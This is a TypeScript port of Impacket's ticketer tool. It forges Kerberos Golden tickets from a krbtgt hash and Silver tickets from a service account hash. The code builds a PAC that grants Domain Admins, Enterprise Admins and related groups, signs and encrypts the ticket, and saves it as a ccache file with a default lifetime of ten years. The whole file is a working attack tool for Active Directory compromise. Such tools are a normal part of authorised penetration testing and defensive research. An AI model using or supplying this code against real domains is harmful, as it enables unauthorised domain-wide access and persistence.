#!/usr/bin/env node
/**
 * Impacket-js - Ticketer
 *
 * Creates Golden/Silver Kerberos tickets. Golden tickets forge a TGT using
 * the krbtgt hash, granting access to any service in the domain. Silver
 * tickets forge a TGS for a specific service using its account hash.
 *
 * Python implementation by Alberto Solino (@agsolino).
 * TypeScript port.
 */

import { Buffer } from 'node:buffer';
import { randomBytes } from 'node:crypto';
import { writeFileSync } from 'node:fs';
import { parseArgs } from 'node:util';

import {
  LogLevel,
  critical,
  getLevel,
  info,
  init as initLogger,
  initProxy,
  debug as logDebug,
  error as logError,
  loadKeytabKeys,
  parseCredentials,
  warning,
  normalizeArgs,
  BANNER,
} from '@impacket/examples';

import type { Asn1Sequence } from '@impacket/asn1';
import { Asn1, CCache, Constants, Crypto, Pac, Types } from '@impacket/krb5';

import type { NDRPOINTER as NDRPOINTERType } from '@impacket/dcerpc';

// ---------- constants ----------

const SE_GROUP_MANDATORY = 0x00000001;
const SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002;
const SE_GROUP_ENABLED = 0x00000004;
const SE_GROUP_ATTRS = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED;

const USER_NORMAL_ACCOUNT = 0x00000010;
const USER_DONT_EXPIRE_PASSWORD = 0x00000200;

const DEFAULT_GROUPS = [512, 513, 518, 519, 520];
const DEFAULT_USER_ID = 500;
const DEFAULT_DURATION = 87600; // hours = 10 years

// Windows FILETIME epoch diff: 100-nanosecond intervals from 1601-01-01 to 1970-01-01
const FILETIME_EPOCH_DIFF = 116444736000000000n;

// ---------- helpers ----------

function dateToFileTime(date: Date): bigint {
  return BigInt(date.getTime()) * 10000n + FILETIME_EPOCH_DIFF;
}

function setFileTime(ndrObj: unknown, ft: bigint): void {
  const obj = ndrObj as { set(k: string, v: number): void };
  obj.set('dwLowDateTime', Number(ft & 0xffffffffn));
  obj.set('dwHighDateTime', Number((ft >> 32n) & 0xffffffffn));
}

function ticketFlagsToBitmask(flags: number[]): number {
  let mask = 0;
  for (const f of flags) {
    mask |= 1 << (31 - f);
  }
  return mask;
}

function formatTimestamp(date: Date): string {
  return date.toISOString().replace('T', ' ').slice(0, 19);
}

// ---------- main class ----------

class TICKETER {
  private domain: string;
  private domainSid: string;
  private username: string;
  private userId: number;
  private groups: number[];
  private extraSid: string[];
  private nthash: string;
  private aesKey: string;
  private spn: string | null;
  private duration: number;
  private extraPac: boolean;

  constructor(opts: {
    domain: string;
    domainSid: string;
    username: string;
    userId: number;
    groups: number[];
    extraSid: string[];
    nthash: string;
    aesKey: string;
    spn: string | null;
    duration: number;
    extraPac: boolean;
  }) {
    this.domain = opts.domain;
    this.domainSid = opts.domainSid;
    this.username = opts.username;
    this.userId = opts.userId;
    this.groups = opts.groups;
    this.extraSid = opts.extraSid;
    this.nthash = opts.nthash;
    this.aesKey = opts.aesKey;
    this.spn = opts.spn;
    this.duration = opts.duration;
    this.extraPac = opts.extraPac;
  }

  async run(): Promise<void> {
    const isGolden = this.spn === null;
    const ticketType = isGolden ? 'Golden' : 'Silver';

    info(`Creating ${ticketType} ticket for ${this.domain}/${this.username}`);

    // Determine encryption type and key
    const { encType, key } = this.resolveKey();

    info(`Using encryption type: ${this.encTypeName(encType)}`);

    // Build the ticket
    const now = new Date();
    const authTime = now;
    const startTime = now;
    const endTime = new Date(now.getTime() + this.duration * 3600 * 1000);
    const renewTill = new Date(now.getTime() + 7 * 24 * 3600 * 1000);

    // Build PAC
    logDebug('Building PAC...');
    const pacData = this.buildPac(authTime, encType);

    // Build ticket
    logDebug('Building ticket...');
    const { ticketAsn1, sessionKey, sessionKeyType } = this.buildTicket(
      key,
      encType,
      pacData,
      authTime,
      startTime,
      endTime,
      renewTill,
    );

    // Save to ccache
    const fileName = `${this.username}.ccache`;
    this.saveTicket(
      ticketAsn1,
      sessionKey,
      sessionKeyType,
      authTime,
      startTime,
      endTime,
      renewTill,
      fileName,
    );

    info(`Ticket saved to ${fileName}`);
    info(`  User      : ${this.username}`);
    info(`  Domain    : ${this.domain}`);
    info(`  SID       : ${this.domainSid}`);
    info(`  User ID   : ${this.userId}`);
    info(`  Groups    : ${this.groups.join(', ')}`);
    if (this.extraSid.length > 0) {
      info(`  Extra SIDs: ${this.extraSid.join(', ')}`);
    }
    info(`  Auth Time : ${formatTimestamp(authTime)}`);
    info(`  End Time  : ${formatTimestamp(endTime)}`);
    if (isGolden) {
      info('  Type      : Golden (TGT)');
      info(`  Service   : krbtgt/${this.domain.toUpperCase()}`);
    } else {
      info('  Type      : Silver (TGS)');
      info(`  Service   : ${this.spn}`);
    }
  }

  private resolveKey(): { encType: number; key: Crypto.Key } {
    if (this.aesKey) {
      const keyBuf = Buffer.from(this.aesKey, 'hex');
      if (keyBuf.length === 32) {
        return {
          encType: Crypto.Enctype.AES256,
          key: new Crypto.Key(Crypto.Enctype.AES256, keyBuf),
        };
      }
      if (keyBuf.length === 16) {
        return {
          encType: Crypto.Enctype.AES128,
          key: new Crypto.Key(Crypto.Enctype.AES128, keyBuf),
        };
      }
      throw new Error(`Invalid AES key length: ${keyBuf.length} bytes (expected 16 or 32)`);
    }

    if (this.nthash) {
      const keyBuf = Buffer.from(this.nthash, 'hex');
      return {
        encType: Crypto.Enctype.RC4,
        key: new Crypto.Key(Crypto.Enctype.RC4, keyBuf),
      };
    }

    throw new Error('You must provide either -nthash or -aesKey');
  }

  private encTypeName(encType: number): string {
    switch (encType) {
      case Crypto.Enctype.AES256:
        return 'aes256-cts-hmac-sha1-96';
      case Crypto.Enctype.AES128:
        return 'aes128-cts-hmac-sha1-96';
      case Crypto.Enctype.RC4:
        return 'rc4-hmac';
      default:
        return `unknown(${encType})`;
    }
  }

  // ---- PAC construction ----

  private buildPac(authTime: Date, encType: number): Buffer {
    const pacInfos = new Map<number, Buffer>();

    // 1. KERB_VALIDATION_INFO (PAC_LOGON_INFO)
    const logonInfoBuf = this.buildKerbValidationInfo(authTime);
    pacInfos.set(Pac.PAC_LOGON_INFO, logonInfoBuf);

    // 2. PAC_CLIENT_INFO
    const clientInfoBuf = this.buildPacClientInfo(authTime);
    pacInfos.set(Pac.PAC_CLIENT_INFO_TYPE, clientInfoBuf);

    // 3. UPN_DNS_INFO (optional but common)
    if (this.extraPac) {
      const upnDnsBuf = this.buildUpnDnsInfo();
      pacInfos.set(Pac.PAC_UPN_DNS_INFO, upnDnsBuf);
    }

    // 4. Signature placeholders
    const checksumType = this.getChecksumType(encType);
    const sigLen = checksumType === Constants.ChecksumTypes.hmac_md5 ? 16 : 12;

    const serverSig = new Pac.PAC_SIGNATURE_DATA();
    serverSig.set('SignatureType', checksumType);
    serverSig.set('Signature', Buffer.alloc(sigLen, 0));
    pacInfos.set(Pac.PAC_SERVER_CHECKSUM, serverSig.getData());

    const kdcSig = new Pac.PAC_SIGNATURE_DATA();
    kdcSig.set('SignatureType', checksumType);
    kdcSig.set('Signature', Buffer.alloc(sigLen, 0));
    pacInfos.set(Pac.PAC_PRIVSVR_CHECKSUM, kdcSig.getData());

    // Sign the PAC
    const signOpts: Pac.SignPacOptions = {};
    if (this.aesKey) {
      signOpts.aesKey = this.aesKey;
    } else {
      signOpts.ntHash = this.nthash;
    }

    const signedPac = Pac.signPac(pacInfos, signOpts);
    return signedPac.getData();
  }

  private getChecksumType(encType: number): number {
    switch (encType) {
      case Crypto.Enctype.AES256:
        return Constants.ChecksumTypes.hmac_sha1_96_aes256;
      case Crypto.Enctype.AES128:
        return Constants.ChecksumTypes.hmac_sha1_96_aes128;
      case Crypto.Enctype.RC4:
        return Constants.ChecksumTypes.hmac_md5;
      default:
        return Constants.ChecksumTypes.hmac_md5;
    }
  }

  private buildKerbValidationInfo(authTime: Date): Buffer {
    const validationInfo = new Pac.VALIDATION_INFO();

    // Access the inner KERB_VALIDATION_INFO through the pointer chain
    const pKerbInfo = validationInfo.fields.Data as NDRPOINTERType;
    const kerbData = pKerbInfo.fields.Data as Pac.KERB_VALIDATION_INFO;

    const ft = dateToFileTime(authTime);
    const maxFt = dateToFileTime(new Date('2037-12-31T23:59:59Z'));

    // Set FILETIME fields
    setFileTime(kerbData.fields.LogonTime, ft);
    setFileTime(kerbData.fields.LogoffTime, maxFt);
    setFileTime(kerbData.fields.KickOffTime, maxFt);
    setFileTime(kerbData.fields.PasswordLastSet, ft);
    setFileTime(kerbData.fields.PasswordCanChange, ft);
    setFileTime(kerbData.fields.PasswordMustChange, maxFt);

    // Set string fields via NDR set() smart routing
    kerbData.set('EffectiveName', this.username);
    kerbData.set('FullName', '');
    kerbData.set('LogonScript', '');
    kerbData.set('ProfilePath', '');
    kerbData.set('HomeDirectory', '');
    kerbData.set('HomeDirectoryDrive', '');

    // Set integer fields
    kerbData.set('LogonCount', 0);
    kerbData.set('BadPasswordCount', 0);
    kerbData.set('UserId', this.userId);
    kerbData.set('PrimaryGroupId', 513);
    kerbData.set('GroupCount', this.groups.length);
    kerbData.set('UserFlags', 0);
    kerbData.set('UserAccountControl', USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD);
    kerbData.set('SubAuthStatus', 0);
    kerbData.set('FailedILogonCount', 0);
    kerbData.set('Reserved3', 0);

    kerbData.set('LogonServer', '');
    kerbData.set('LogonDomainName', this.domain.toUpperCase());

    // Set last logon times to zero
    setFileTime(kerbData.fields.LastSuccessfulILogon, 0n);
    setFileTime(kerbData.fields.LastFailedILogon, 0n);

    // Set groups
    const groupsPtr = kerbData.fields.GroupIds as NDRPOINTERType;
    const groupsArr = groupsPtr.fields.Data as { fields: Record<string, unknown> };
    const groupItems: Pac.GROUP_MEMBERSHIP[] = [];
    for (const rid of this.groups) {
      const gm = new Pac.GROUP_MEMBERSHIP();
      gm.set('RelativeId', rid);
      gm.set('Attributes', SE_GROUP_ATTRS);
      groupItems.push(gm);
    }
    groupsArr.fields.Data = groupItems;

    // Set domain SID
    const logonDomainIdPtr = kerbData.fields.LogonDomainId as NDRPOINTERType;
    const domainSid = logonDomainIdPtr.fields.Data as { fromCanonical(s: string): void };
    domainSid.fromCanonical(this.domainSid);

    // Handle extra SIDs
    if (this.extraSid.length > 0) {
      kerbData.set('SidCount', this.extraSid.length);

      const extraSidsPtr = kerbData.fields.ExtraSids as NDRPOINTERType;
      const extraSidsArr = extraSidsPtr.fields.Data as { fields: Record<string, unknown> };
      const extraSidItems: Pac.KERB_SID_AND_ATTRIBUTES[] = [];

      for (const sidStr of this.extraSid) {
        const sidAndAttrs = new Pac.KERB_SID_AND_ATTRIBUTES();
        // Access the SID pointer within the KERB_SID_AND_ATTRIBUTES
        const sidFieldPtr = sidAndAttrs.fields.Sid as NDRPOINTERType;
        const sidObj = sidFieldPtr.fields.Data as { fromCanonical(s: string): void };
        sidObj.fromCanonical(sidStr);
        sidAndAttrs.set('Attributes', SE_GROUP_ATTRS);
        extraSidItems.push(sidAndAttrs);
      }
      extraSidsArr.fields.Data = extraSidItems;
    } else {
      kerbData.set('SidCount', 0);
      // Set ExtraSids pointer to null (ReferentID=0)
      const extraSidsPtr = kerbData.fields.ExtraSids as { fields: Record<string, unknown> };
      extraSidsPtr.fields.ReferentID = 0;
    }

    // Set ResourceGroup pointers to null
    const resourceGroupSidPtr = kerbData.fields.ResourceGroupDomainSid as {
      fields: Record<string, unknown>;
    };
    resourceGroupSidPtr.fields.ReferentID = 0;
    kerbData.set('ResourceGroupCount', 0);
    const resourceGroupIdsPtr = kerbData.fields.ResourceGroupIds as {
      fields: Record<string, unknown>;
    };
    resourceGroupIdsPtr.fields.ReferentID = 0;

    return validationInfo.getData();
  }

  private buildPacClientInfo(authTime: Date): Buffer {
    const clientInfo = new Pac.PAC_CLIENT_INFO();
    const ft = dateToFileTime(authTime);
    clientInfo.set('ClientId', ft);
    const nameUtf16 = Buffer.from(this.username, 'utf16le');
    clientInfo.set('NameLength', nameUtf16.length);
    clientInfo.set('Name', nameUtf16);
    return clientInfo.getData();
  }

  private buildUpnDnsInfo(): Buffer {
    const upn = `${this.username}@${this.domain.toUpperCase()}`;
    const dnsDomain = this.domain.toUpperCase();

    const upnUtf16 = Buffer.from(upn, 'utf16le');
    const dnsUtf16 = Buffer.from(dnsDomain, 'utf16le');

    // UPN_DNS_INFO header is 12 bytes (2+2+2+2+4)
    const headerLen = 12;

    const upnOffset = headerLen;
    const dnsOffset = upnOffset + upnUtf16.length;

    const header = Buffer.alloc(headerLen);
    header.writeUInt16LE(upnUtf16.length, 0); // UpnLength
    header.writeUInt16LE(upnOffset, 2); // UpnOffset
    header.writeUInt16LE(dnsUtf16.length, 4); // DnsDomainNameLength
    header.writeUInt16LE(dnsOffset, 6); // DnsDomainNameOffset
    header.writeUInt32LE(0, 8); // Flags

    return Buffer.concat([header, upnUtf16, dnsUtf16]);
  }

  // ---- Ticket construction ----

  private buildTicket(
    key: Crypto.Key,
    encType: number,
    pacData: Buffer,
    authTime: Date,
    startTime: Date,
    endTime: Date,
    renewTill: Date,
  ): { ticketAsn1: Buffer; sessionKey: Buffer; sessionKeyType: number } {
    const isGolden = this.spn === null;
    const upperDomain = this.domain.toUpperCase();

    // Generate random session key (same enc type as ticket key)
    const profile = Crypto._get_enctype_profile(encType);
    const sessionKey = randomBytes(profile.keysize);

    // Build ticket flags
    const ticketFlags = [
      Constants.TicketFlags.forwardable,
      Constants.TicketFlags.proxiable,
      Constants.TicketFlags.renewable,
      Constants.TicketFlags.pre_authent,
    ];
    if (isGolden) {
      ticketFlags.push(Constants.TicketFlags.initial);
    }

    // Build authorization data: PAC wrapped in AD_IF_RELEVANT
    const adIfRelevant = Asn1.AD_IF_RELEVANT();
    const adElement = adIfRelevant.elementNode as Asn1Sequence;
    adElement.set('ad-type', Constants.AuthorizationDataType.AD_WIN2K_PAC);
    adElement.set('ad-data', pacData);
    adIfRelevant.add(adElement);
    const adIfRelevantEncoded = adIfRelevant.encode();

    // Build the outer AuthorizationData sequence
    const authzData = Asn1.AuthorizationData();
    const outerElement = authzData.elementNode as Asn1Sequence;
    outerElement.set('ad-type', Constants.AuthorizationDataType.AD_IF_RELEVANT);
    outerElement.set('ad-data', adIfRelevantEncoded);
    authzData.add(outerElement);

    // Build EncTicketPart
    const encTicketPart = Asn1.EncTicketPart();
    Asn1.seqSetFlags(encTicketPart, 'flags', ticketFlags);

    // Set session key
    const keySeq = encTicketPart.getComponent('key') as Asn1Sequence;
    keySeq.set('keytype', encType);
    keySeq.set('keyvalue', sessionKey);
    encTicketPart.set('key', keySeq);

    encTicketPart.set('crealm', upperDomain);

    // Set client name
    const cname = Asn1.principalToAsn1({
      type: Constants.PrincipalNameType.NT_PRINCIPAL,
      components: [this.username],
    });
    encTicketPart.set('cname', cname);

    // Set transited encoding
    const transited = encTicketPart.getComponent('transited') as Asn1Sequence;
    transited.set('tr-type', Constants.TransitedEncodingTypes.DOMAIN_X500_COMPRESS);
    transited.set('contents', Buffer.alloc(0));
    encTicketPart.set('transited', transited);

    // Set times
    encTicketPart.set('authtime', authTime);
    encTicketPart.set('starttime', startTime);
    encTicketPart.set('endtime', endTime);
    encTicketPart.set('renew-till', renewTill);

    // Set authorization data (PAC)
    encTicketPart.set('authorization-data', authzData);

    // Encode and encrypt EncTicketPart
    const encTicketPartEncoded = encTicketPart.encode();
    logDebug(`EncTicketPart encoded: ${encTicketPartEncoded.length} bytes`);

    // Key usage: 2 for ticket encryption
    const encryptedData = Crypto.encrypt(key, 2, encTicketPartEncoded);

    // Build service name
    let sname: { type: number; components: string[] };
    if (isGolden) {
      sname = {
        type: Constants.PrincipalNameType.NT_SRV_INST,
        components: ['krbtgt', upperDomain],
      };
    } else {
      const spnParts = this.spn!.split('/');
      sname = {
        type: Constants.PrincipalNameType.NT_SRV_INST,
        components: spnParts,
      };
    }

    // Build Ticket
    const ticket = Asn1.Ticket();
    ticket.set('tkt-vno', 5);
    ticket.set('realm', upperDomain);

    const snameAsn1 = Asn1.principalToAsn1(sname);
    ticket.set('sname', snameAsn1);

    // Build enc-part
    const encPartSeq = ticket.getComponent('enc-part') as Asn1Sequence;
    encPartSeq.set('etype', encType);
    encPartSeq.set('kvno', 2);
    encPartSeq.set('cipher', encryptedData);
    ticket.set('enc-part', encPartSeq);

    const ticketEncoded = ticket.encode();
    logDebug(`Ticket encoded: ${ticketEncoded.length} bytes`);

    return {
      ticketAsn1: ticketEncoded,
      sessionKey,
      sessionKeyType: encType,
    };
  }

  // ---- CCache saving ----

  private saveTicket(
    ticketData: Buffer,
    sessionKey: Buffer,
    sessionKeyType: number,
    authTime: Date,
    startTime: Date,
    endTime: Date,
    renewTill: Date,
    fileName: string,
  ): void {
    const isGolden = this.spn === null;
    const upperDomain = this.domain.toUpperCase();

    const ccache = new CCache.CCache();
    ccache.setDefaultHeader();

    // Set the primary principal (client)
    const clientPrincipal = new Types.Principal(
      this.username,
      upperDomain,
      Constants.PrincipalNameType.NT_PRINCIPAL,
    );
    ccache.principal = new CCache.PrincipalCCache();
    ccache.principal.fromPrincipal(clientPrincipal);

    // Build the credential
    const cred = new CCache.Credential();

    // Client principal
    cred.client = new CCache.PrincipalCCache();
    cred.client.fromPrincipal(clientPrincipal);

    // Server principal
    let serverPrincipal: Types.Principal;
    if (isGolden) {
      serverPrincipal = new Types.Principal(
        [['krbtgt', upperDomain], upperDomain],
        null,
        Constants.PrincipalNameType.NT_SRV_INST,
      );
    } else {
      const spnParts = this.spn!.split('/');
      serverPrincipal = new Types.Principal(
        [...spnParts, upperDomain] as unknown as [string[], string],
        null,
        Constants.PrincipalNameType.NT_SRV_INST,
      );
    }
    cred.server = new CCache.PrincipalCCache();
    cred.server.fromPrincipal(serverPrincipal);

    // Session key
    cred.key = new CCache.KeyBlock();
    cred.key.keytype = sessionKeyType;
    cred.key.etype = 0;
    cred.key.keyvalue = sessionKey;

    // Times (Unix epoch seconds)
    cred.time = new CCache.Times();
    cred.time.authtime = Math.floor(authTime.getTime() / 1000);
    cred.time.starttime = Math.floor(startTime.getTime() / 1000);
    cred.time.endtime = Math.floor(endTime.getTime() / 1000);
    cred.time.renew_till = Math.floor(renewTill.getTime() / 1000);

    // Flags
    const ticketFlags = [
      Constants.TicketFlags.forwardable,
      Constants.TicketFlags.proxiable,
      Constants.TicketFlags.renewable,
      Constants.TicketFlags.pre_authent,
    ];
    if (isGolden) {
      ticketFlags.push(Constants.TicketFlags.initial);
    }
    cred.tktflags = ticketFlagsToBitmask(ticketFlags);
    cred.is_skey = 0;

    // Ticket data
    cred.ticket = new CCache.CountedOctetString();
    cred.ticket.data = ticketData;

    // Second ticket (empty)
    cred.secondTicket = new CCache.CountedOctetString();

    ccache.credentials.push(cred);

    // Write to file
    const ccacheData = ccache.getData();
    writeFileSync(fileName, ccacheData);
    logDebug(`CCache written: ${ccacheData.length} bytes`);
  }
}

// ---------- CLI ----------

function usage(): never {
  console.log(`Creates a Kerberos golden/silver tickets based on user options

usage: ticketer [-h] [-spn SPN] -domain DOMAIN
                -domain-sid DOMAIN_SID [-aesKey hex key] [-nthash NTHASH]
                [-keytab KEYTAB] [-groups GROUPS] [-user-id USER_ID]
                [-extra-sid EXTRA_SID] [-extra-pac] [-old-pac]
                [-duration DURATION] [-ts] [-debug]
                identity

positional arguments:
  identity              username for the newly created ticket

options:
  -h, --help            show this help message and exit
  -spn SPN              SPN (service/server) of the target service the silver
                        ticket will be generated for. if omitted, golden
                        ticket is created
  -domain DOMAIN        the fully qualified domain name (e.g. contoso.com)
  -domain-sid DOMAIN_SID
                        Domain SID of the target domain the ticker will be
                        generated for
  -aesKey hex key       AES key used for signing the ticket (128 or 256 bits)
  -nthash NTHASH        NT hash used for signing the ticket
  -keytab KEYTAB        Read keys for SPN from keytab file (silver ticket
                        only)
  -groups GROUPS        comma separated list of groups user will belong to
                        (default = 513, 512, 520, 518, 519)
  -user-id USER_ID      user id for the user the ticket will be created for
                        (default = 500)
  -extra-sid EXTRA_SID  Comma separated list of ExtraSids to be included
                        inside the ticket's PAC
  -extra-pac            Populate your ticket with extra PAC (UPN_DNS)
  -old-pac              Use the old PAC structure to create your ticket
                        (exclude PAC_ATTRIBUTES_INFO and PAC_REQUESTOR)
  -duration DURATION    Amount of hours till the ticket expires (default =
                        87600)
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
`);
  process.exit(1);
}

async function main(): Promise<void> {
  const args = normalizeArgs(process.argv.slice(2));

  if (args.length === 0) {
    usage();
  }

  console.log(BANNER + '\n');

  let values: any;
  let positionals: string[];
  try {
    ({ values, positionals } = parseArgs({
      args,
      allowPositionals: true,
      options: {
        nthash: { type: 'string' },
        aesKey: { type: 'string' },
        domain: { type: 'string' },
        'domain-sid': { type: 'string' },
        spn: { type: 'string' },
        keytab: { type: 'string' },
        'user-id': { type: 'string' },
        groups: { type: 'string' },
        'extra-sid': { type: 'string' },
        'extra-pac': { type: 'boolean', default: false },
        'old-pac': { type: 'boolean', default: false },
        duration: { type: 'string' },
        ts: { type: 'boolean', default: false },
        debug: { type: 'boolean', default: false },
        proxy: { type: 'string' },
        help: { type: 'boolean', short: 'h', default: false },
      },
    }));
  } catch (e) {
    console.error(`[-] ${(e as Error).message}`);
    usage();
  }

  if (values.help || positionals.length < 1) {
    usage();
  }

  const identity = positionals[0]!;

  initProxy(values.proxy);
  initLogger({ ts: values.ts, debug: values.debug });

  // Parse identity: [domain/]username
  const [parsedDomain, parsedUsername] = parseCredentials(identity);
  const domain = values.domain ?? parsedDomain;
  const username = parsedUsername;

  if (!domain) {
    critical('Domain is required. Specify via identity (domain/user) or -domain flag.');
    process.exit(1);
  }

  if (!username) {
    critical('Username is required.');
    process.exit(1);
  }

  const domainSid = values['domain-sid'];
  if (!domainSid) {
    critical('Domain SID is required (-domain-sid S-1-5-21-...)');
    process.exit(1);
  }

  // Validate SID format
  if (!domainSid.match(/^S-1-5-21-\d+-\d+-\d+$/)) {
    warning('Domain SID format may be incorrect. Expected: S-1-5-21-<rid>-<rid>-<rid>');
  }

  let nthash = values.nthash ?? '';
  let aesKey = values.aesKey ?? '';

  // Load keys from keytab if provided
  if (values.keytab) {
    logDebug(`Reading keytab file: ${values.keytab}`);
    const ktKeys = loadKeytabKeys(values.keytab);
    if (ktKeys.aesKey && !aesKey) aesKey = ktKeys.aesKey;
    if (ktKeys.nthash && !nthash) nthash = ktKeys.nthash;
  }

  if (!nthash && !aesKey) {
    critical('You must provide either -nthash, -aesKey, or -keytab');
    process.exit(1);
  }

  // Validate key formats
  if (nthash && !nthash.match(/^[0-9a-fA-F]{32}$/)) {
    critical('Invalid NT hash format. Expected 32 hex characters.');
    process.exit(1);
  }

  if (aesKey && !aesKey.match(/^[0-9a-fA-F]{32}$/) && !aesKey.match(/^[0-9a-fA-F]{64}$/)) {
    critical('Invalid AES key format. Expected 32 (AES128) or 64 (AES256) hex characters.');
    process.exit(1);
  }

  const userId = values['user-id'] ? parseInt(values['user-id'], 10) : DEFAULT_USER_ID;
  if (Number.isNaN(userId)) {
    critical('Invalid user-id value');
    process.exit(1);
  }

  let groups = DEFAULT_GROUPS;
  if (values.groups) {
    groups = values.groups.split(',').map((s) => {
      const n = parseInt(s.trim(), 10);
      if (Number.isNaN(n)) {
        critical(`Invalid group RID: ${s}`);
        process.exit(1);
      }
      return n;
    });
  }

  let extraSid: string[] = [];
  if (values['extra-sid']) {
    extraSid = values['extra-sid'].split(',').map((s) => s.trim());
  }

  const duration = values.duration ? parseInt(values.duration, 10) : DEFAULT_DURATION;
  if (Number.isNaN(duration) || duration <= 0) {
    critical('Invalid duration value');
    process.exit(1);
  }

  const spn = values.spn ?? null;

  if (values['old-pac']) {
    warning('PAC is already built without PAC_ATTRIBUTES_INFO and PAC_REQUESTOR. The -old-pac flag has no additional effect.');
  }

  try {
    const ticketer = new TICKETER({
      domain,
      domainSid,
      username,
      userId,
      groups,
      extraSid,
      nthash,
      aesKey,
      spn,
      duration,
      extraPac: values['extra-pac'] ?? false,
    });
    await ticketer.run();
  } catch (e) {
    if (getLevel() === LogLevel.DEBUG) {
      console.error(e);
    }
    logError(String(e));
  }
}

main();
